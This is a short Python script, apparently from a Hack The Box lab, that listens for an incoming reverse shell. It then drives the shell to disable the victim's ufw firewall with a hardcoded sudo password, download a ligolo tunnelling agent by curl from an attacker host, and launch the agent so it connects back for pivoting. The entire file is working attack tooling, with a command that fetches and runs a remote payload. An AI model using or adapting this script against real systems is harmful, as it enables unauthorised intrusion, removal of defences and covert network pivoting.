#!/usr/bin/env python3
"""One-shot reverse shell: root cleanup + ligolo agent only."""
import socket
import threading
import sys
import time

PORT = 5555
PASS = r"opc0932k90%%lODFI93-++"
LHOST = "10.10.15.183"

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
s.listen(1)
print(f"[*] listen {PORT}", flush=True)
c, a = s.accept()
print(f"[+] {a}", flush=True)
buf = b""


def recv():
    global buf
    while True:
        d = c.recv(8192)
        if not d:
            break
        buf += d
        sys.stdout.buffer.write(d)
        sys.stdout.flush()


threading.Thread(target=recv, daemon=True).start()
time.sleep(1)

cmds = [
    f"echo '{PASS}' | sudo -S ufw disable",
    f"curl -fsSL -o /tmp/agent64 http://{LHOST}:8090/agent64",
    "chmod +x /tmp/agent64 && ls -la /tmp/agent64",
    f"nohup /tmp/agent64 -connect {LHOST}:11601 -ignore-cert >/tmp/agent.log 2>&1 &",
    "sleep 2; cat /tmp/agent.log; ps aux | grep '[a]gent64'; echo DONE_LIGOLO",
]
for cmd in cmds:
    print(f"\n>>> {cmd}", flush=True)
    c.send((cmd + "\n").encode())
    time.sleep(4 if "curl" in cmd else 2)

time.sleep(3)
open(r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\shell_ligolo.txt", "wb").write(buf)
print("\n[*] saved shell_ligolo.txt", flush=True)
c.close()
